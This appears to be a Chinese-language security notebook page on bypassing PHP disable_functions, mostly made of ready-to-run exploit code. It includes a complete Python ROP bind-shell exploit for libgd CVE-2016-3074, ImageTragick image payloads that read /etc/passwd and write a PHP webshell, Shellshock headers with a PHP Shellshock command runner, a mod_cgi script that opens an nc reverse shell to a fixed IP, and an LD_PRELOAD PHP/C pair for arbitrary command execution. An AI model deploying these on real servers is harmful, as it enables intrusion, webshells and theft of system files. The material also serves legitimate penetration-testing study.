# 绕过Disable_function

## opcache命令执行

参考

- http://www.vuln.cn/6763
- https://github.com/GoSecure/php7-opcache-override

### 利用条件

- 文件上传漏洞，上传点需要可控或者为opcache.file_cache的目录。
- opcache.file_timestamps=0（默认为1）或者被缓存文件时间戳已知。
- opache.file_cache_only=1（默认为0）或者文件无内存缓存。因为内存缓存优先级别高于文件缓存

### 安装

```bash
apt-get install php7.0-opcache
sed -i 's~;opcache.file_cache=~opcache.file_cache=/tmp/opcache~' /etc/php/7.0/apache2/php.ini
sed -i 's~;opcache.validate_timestamps=1~opcache.validate_timestamps=0~' /etc/php/7.0/apache2/php.ini
sed -i 's~;opcache.file_cache_only=0~opcache.file_cache_only=1~' /etc/php/7.0/apache2/php.ini
service apache2 restart
```

### 利用

- 确认目标可能存在漏洞环境。
- 本地生成shell的opcache二进制文件shell.php.bin。
- 更改shell.php.bin的systemid，如果知道目标文件时间戳，也更改shell.php.bin的时间戳。
- 上传shell.php.bin到opcache缓存目录（如：/tmp/opcache/(systemid)/var/www/index.php.bin）
- 重新访问index.php

简单叙述如下：  
访问index.php，如果opcache_cache文件夹中存在该文件的index.php.bin缓存文件，则加载该文件，不访问网站根目录下的index.php。  

假如我们已知一个目标站点存在的文件，我们构造其对应的缓存文件放置到opcache_cache文件夹中，则该文件会被加载。  

但是访问缓存文件时，php会检测时间轴的一致性以及是否存在内存缓存。这也是我们为什么设置file_timestamps和file_cache_only的原因。  

但是我们如果已知文件时间轴并且该文件不常用，则我们可以伪造缓存文件的时间戳，绕过timestamps。而文件不常用，则不存在内存缓存。

## GD库漏洞

CVE-2016-3074_命令执行漏洞

参考

- https://github.com/dyntopia/exploits/tree/master/CVE-2016-3074
- https://github.com/libgd/libgd/commit/2bb97f407c1145c850416a3bfbcc8cf124e68a19

（GD Graphics Library <= 2.1.1 (aka libgd or libgd2)）

### Exp

exp:

```python
#!/usr/bin/env python2
#
# PoC for CVE-2016-3074 targeting Ubuntu 15.10 x86-64 with php5-gd and
# php5-fpm running behind nginx.
#
# ,----
# | $ python exploit.py --bind-port 5555 http://1.2.3.4/upload.php
# | [*] this may take a while
# | [*] offset 912 of 10000...
# | [+] connected to 1.2.3.4:5555
# | id
# | uid=33(www-data) gid=33(www-data) groups=33(www-data)
# |
# | uname -a
# | Linux wily64 4.2.0-35-generic #40-Ubuntu SMP Tue Mar 15 22:15:45 UTC
# | 2016 x86_64 x86_64 x86_64 GNU/Linux
# |
# | dpkg -l|grep -E "php5-(fpm|gd)"
# | ii  php5-fpm       5.6.11+dfsg-1ubuntu3.1 ...
# | ii  php5-gd        5.6.11+dfsg-1ubuntu3.1 ...
# |
# | cat upload.php
# | <?php
# |     imagecreatefromgd2($_FILES["file"]["tmp_name"]);
# | ?>
# `----
#
# - Hans Jerry Illikainen
#
import sys
import os
import zlib
import socket
import threading
import argparse
import urlparse
from struct import pack

import requests

# non-optimized bindshell from binjitsu
#
# context(arch="amd64", os="linux")
# asm(shellcraft.bindsh(port, "ipv4"))
shellcode = [
    "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba",
    "%(fam-and-port)s\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7",
    "\x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef",
    "\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99",
    "\x0f\x05\x48\x89\xc5\x6a\x03\x5e\x48\xff\xce\x78\x0b\x56",
    "\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x48\xb8",
    "\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x6a\x3b\x58\x48\x89",
    "\xe7\x31\xf6\x99\x0f\x05"
]

gadgets = [
    "\x90" * 40,

    # [16]
    #
    # 0xb6eca2:  popfq
    # 0xb6eca3:  callq  *%rsp
    pack("<Q", 0xb6eca2),

    "%(pad)s",

    # [2]
    #
    # 0x4dbe8c:  add  $0xd8,%rsp
    # 0x4dbe93:  retq
    pack("<Q", 0x4dbe8c),

    "\x90" * 48,

    # [1]
    #
    # (gdb) x/x {void *}($rsp + 8)
    # 0x12d7d60:  0x9090909090909090
    #
    # 0xa91f35:  rex.WXB  pop %r14
    # 0xa91f37:  mov      $0x3,%bh
    # 0xa91f39:  pop      %rsp
    # 0xa91f3a:  retq
    pack("<Q", 0xa91f35),

    "\x90" * 152,

    # [0]
    #
    # (gdb) x/i $rip
    # => 0x7f91acf61f46:  callq  *0x70(%rax)
    #
    # (gdb) x/gx 0x432b80
    # 0x432b80:  0x0000000000547880
    #
    # (gdb) x/3i 0x0000000000547880
    # 0x547880:  push   %rbx
    # 0x547881:  mov    %rdi,%rbx
    # 0x547884:  callq  *0x20(%rdi)
    pack("<Q", 0x432b80 - 0x70),

    # [3]
    #
    # 0x463e2c:  pop  %rbx
    # 0x463e2d:  retq
    pack("<Q", 0x463e2c),

    # [7]
    #
    # 0x463b1d:  pop  %r12
    # 0x463b1f:  retq
    pack("<Q", 0x463b1d),

    # [4]
    #
    # 0x473053:  pop  %rax
    # 0x473054:  retq
    pack("<Q", 0x473053),

    # [6]
    #
    # 0xa8bc37:  push  %rdx
    # 0xa8bc38:  jmpq  *%rbx
    pack("<Q", 0xa8bc37),

    # [5]
    #
    # 0x7b2eaf:  mov   %r9,%rdx
    # 0x7b2eb2:  jmpq  *%rax
    pack("<Q", 0x7b2eaf),

    # [8]
    #
    # 0x552768:  mov  %rdi,%rax
    # 0x55276b:  retq
    pack("<Q", 0x552768),

    # [9]
    #
    # 0x463e2c:  pop  %rbx
    # 0x463e2d:  retq
    pack("<Q", 0x463e2c),
    pack("<Q", 0xfffff000),

    # [10]
    #
    # 0xb6c734:  and  %ebx,%eax
    # 0xb6c736:  es retq
    pack("<Q", 0xb6c734),

    # [11]
    #
    # 0x4c93e9:  xchg  %eax,%ebx
    # 0x4c93ea:  retq
    pack("<Q", 0x4c93e9),

    # [12]
    #
    # 0x406a08:  pop  %rcx (len, 0x5555)
    # 0x406a09:  retq
    pack("<Q", 0x406a08),
    pack("<Q", 0x5555),

    # [13]
    #
    # 0xaf58fd:  pop  %rdx (PROT_READ|PROT_WRITE|PROT_EXEC)
    # 0xaf58fe:  retq
    pack("<Q", 0xaf58fd),
    pack("<Q", 7),

    # [14]
    #
    # 0x473053:  pop  %rax (mprotect)
    # 0x473054:  retq
    pack("<Q", 0x473053),
    pack("<Q", 125),

    # [15]
    #
    # 0x53f9f8:  int    $0x80
    # 0x53f9fa:  mov    0x38(%r12),%rsi
    # 0x53f9ff:  mov    $0x8f,%edi
    # 0x53fa04:  callq  *0x28(%r12)
    pack("<Q", 0x53f9f8),

    "\x90" * 100,
]

# gd.h: #define gdMaxColors 256
gd_max_colors = 256

def make_gd2(chunks):
    gd2 = [
        "gd2\x00",                    # signature
        pack(">H", 2),                # version
        pack(">H", 1),                # image size (x)
        pack(">H", 1),                # image size (y)
        pack(">H", 0x40),             # chunk size (0x40 <= cs <= 0x80)
        pack(">H", 2),                # format (GD2_FMT_COMPRESSED)
        pack(">H", 1),                # num of chunks wide
        pack(">H", len(chunks))       # num of chunks high
    ]
    colors = [
        pack(">B", 0),                # trueColorFlag
        pack(">H", 0),                # im->colorsTotal
        pack(">I", 0),                # im->transparent
        pack(">I", 0) * gd_max_colors # red[i], green[i], blue[i], alpha[i]
    ]

    offset = len("".join(gd2)) + len("".join(colors)) + len(chunks) * 8
    for data, size in chunks:
        gd2.append(pack(">I", offset)) # cidx[i].offset
        gd2.append(pack(">I", size))   # cidx[i].size
        offset += size

    return "".join(gd2 + colors + [data for data, size in chunks])

def connect(host, port):
    addr = socket.gethostbyname(host)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((addr, port))
    except socket.error:
        return

    print("\n[+] connected to %s:%d" % (host, port))
    if os.fork() == 0:
        while True:
            try:
                data = sock.recv(8192)
            except KeyboardInterrupt:
                sys.exit("\n[!] receiver aborting")
            if data == "":
                sys.exit("[!] receiver aborting")
            sys.stdout.write(data)
    else:
        while True:
            try:
                cmd = sys.stdin.readline()
            except KeyboardInterrupt:
                sock.close()
                sys.exit("[!] sender aborting")
            sock.send(cmd)

def get_payload(offset, port):
    rop = "".join(gadgets) % {"pad": "\x90" * offset}

    fam_and_port = pack("<I", (socket.AF_INET | (socket.htons(port) << 16)))
    sc = "".join(shellcode) % {"fam-and-port": fam_and_port}

    return rop + sc

def get_args():
    p = argparse.ArgumentParser()
    p.add_argument("--threads", type=int, default=20)
    p.add_argument("--bind-port", type=int, default=8000)
    p.add_argument("--offsets", type=int, default=[0, 10000], nargs=2)
    p.add_argument("url")
    return p.parse_args()

def send_gd2(url, gd2, code):
    files = {"file": gd2}
    try:
        req = requests.post(url, files=files, timeout=5)
        code.append(req.status_code)
    except requests.exceptions.ReadTimeout:
        pass

def main():
    args = get_args()
    host = urlparse.urlparse(args.url).netloc.split(":")[0]

    print("[*] this may take a while")
    for i in range(args.offsets[0], args.offsets[1]):
        sys.stdout.write("\r[*] offset %d of %d..." % (i, args.offsets[1]))
        sys.stdout.flush()

        valid = zlib.compress("A" * 100, 0)
        payload = get_payload(i, args.bind_port)
        gd2 = make_gd2([(valid, len(valid)), (payload, 0xffffffff)])

        threads = []
        code = []
        for _ in range(args.threads):
            t = threading.Thread(target=send_gd2, args=(args.url, gd2, code))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        if 404 in code:
            sys.exit("\n[-] 404: %s" % args.url)
        connect(host, args.bind_port)

    print("\n[-] nope...")

if __name__ == "__main__":
    main()
```

demo

```php
<?php
    imagecreatefromgd2($_FILES["file"]["tmp_name"]);
?>
```

## 魔图漏洞

### CVE-2016-3714

（The (1) EPHEMERAL, (2) HTTPS, (3) MVG, (4) MSL, (5) TEXT, (6) SHOW, (7) WIN, and (8) PLT coders in ImageMagick before 6.9.3-10 and 7.x before 7.0.1-1 allow remote attackers to execute arbitrary code via shell metacharacters in a crafted image, aka "ImageTragick."）

参考

- https://github.com/ImageTragick/PoCs
- https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
- https://github.com/vulhub/vulhub/blob/master/imagemagick/imagetragick/README.zh-cn.md

利用

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`cat /etc/passwd > /tmp/success`'
pop graphic-context
```

### CVE-2016-3718

利用

poc.jpg

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://enav06y2ix9ic.x.pipedream.net)'
pop graphic-context
```

### CVE-2016-3715

利用

poc.jpg

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:/tmp/success'
popgraphic-context
```

下面这2个，3716没有复现成功，3717没有回显，就没有复现了

### CVE-2016-3716

利用

利用ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell。特别说明的是，msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作：

file_move.mvg

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'msl:/tmp/msl.txt'
popgraphic-context
```

/tmp/msl.txt

```
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="/tmp/image.gif" />
<write filename="/var/www/shell.php" />
</image>
```

### CVE-2016-3717

可以造成本地文件读取漏洞

利用

poc.jpg

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/hosts'
pop graphic-context
```

## 破壳漏洞

参考

- https://www.cnblogs.com/qmfsun/p/7591757.html
- https://github.com/vulhub/vulhub/tree/master/bash/shellshock

![](/Users/j7ur8/WebBook/BookBuild/images/破壳漏洞影响范围.png)
GNU Bash <= 4.3，此漏洞可能会影响到使用ForceCommand功能的OpenSSH sshd、使用mod_cgi或mod_cgid的Apache服务器、DHCP客户端、其他使用Bash作为解释器的应用等。



### 解析

[web服务器和CGI的关系](https://blog.csdn.net/kobejayandy/article/details/11906505)

![](/Users/j7ur8/WebBook/BookBuild/images/491580-20170926162151276-378081397.png)

### Exp

```http
GET /victim.cgi HTTP/1.1
Host: 127.0.0.1:1235
User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id
```

```
User-Agent: () { :;};a=`/bin/cat /etc/passwd`;echo "a: $a"
User-Agent: () { :;}; echo `/bin/cat /etc/passwd`
```

**php mail相关函数可利用此漏洞**

poc

```php
<?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 

function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(".","data"); 
   putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1"); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != "") return $output; 
   else return "No output, or not vuln."; 
} 
echo shellshock($_REQUEST["cmd"]); 
?>
```

imap_mail函数同样也可以

## CGI绕过

参考

- http://0cx.cc/bypass_disabled_via_mod_cgi.jspx

### 利用条件

- 开启了cgi
- 目录可写
- .htaccess文件可用

### Exp

```php
<?php
$cmd = "nc -c '/bin/bash' 172.16.15.1 4444";
$shellfile = "#!/bin/bash\n"; 
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n";
$shellfile .= "$cmd";
function checkEnabled($text,$condition,$yes,$no) {
    echo "$text: " . ($condition ? $yes : $no) . "<br>\n";
}
if (!isset($_GET['checked'])){
    @file_put_contents('.htaccess', "\nSetEnv HTACCESS on", FILE_APPEND); 
    header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); 
}else{
    $modcgi = in_array('mod_cgi', apache_get_modules()); 
    $writable = is_writable('.');
    $htaccess = !empty($_SERVER['HTACCESS']); 
        checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
        checkEnabled("Is writable",$writable,"Yes","No");
        checkEnabled("htaccess working",$htaccess,"Yes","No");
    if(!($modcgi && $writable && $htaccess))  {
        echo "Error. All of the above must be true for the script to work!"; 
    } else{
        checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); 
        checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGI\nAddHandler cgi-script .dizzle"),"Succeeded!","Failed!");
        checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); 
        checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); 
        echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>"; 
    }
}
?>
```

## LD_PRELOAD劫持系统函数

（PHP 支持putenv()、mail() 即可，甚至无需安装 sendmail）

参考

- https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?files=1&tdsourcetag=s_pcqq_aiomsg

利用环境变量LD_PRELOAD劫持系统函数，让外部程序加载恶意的.so文件，达到执行系统命令的效果。

### 分析

- 编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；
- 运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 getuid_shadow.so，以便后续启动新进程时优先加载该共享对象；
- 运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名 getuid() 所劫持；
- 达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。

### 改进版利用过程

- GCC 有个 C 语言扩展修饰符 `__attribute__((constructor))`，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 `__attribute__((constructor))` 修饰的函数
- 运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 getuid_shadow.so，以便后续启动新进程时优先加载该共享对象；
- 运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名 getuid() 所劫持；
- 达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。

### Exp

exp.php

```php
<?php
    echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";
    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
    putenv("EVIL_CMDLINE=" . $evil_cmdline);
    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);
    mail("", "", "", "");
    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
    unlink($out_path);
?>
```

exp.c

```c
//用命令 gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so 将 bypass_disablefunc.c 编译而来。 若目标为 x86 架构，需要加上 -m32 选项重新编译
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>


extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    // get command line options and arg
    const char* cmdline = getenv("EVIL_CMDLINE");

    // unset environment variable LD_PRELOAD.
    // unsetenv("LD_PRELOAD") no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = '\0';
            }
    }

    // executive command
    system(cmdline);
}
```

## 漏网函数

常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；

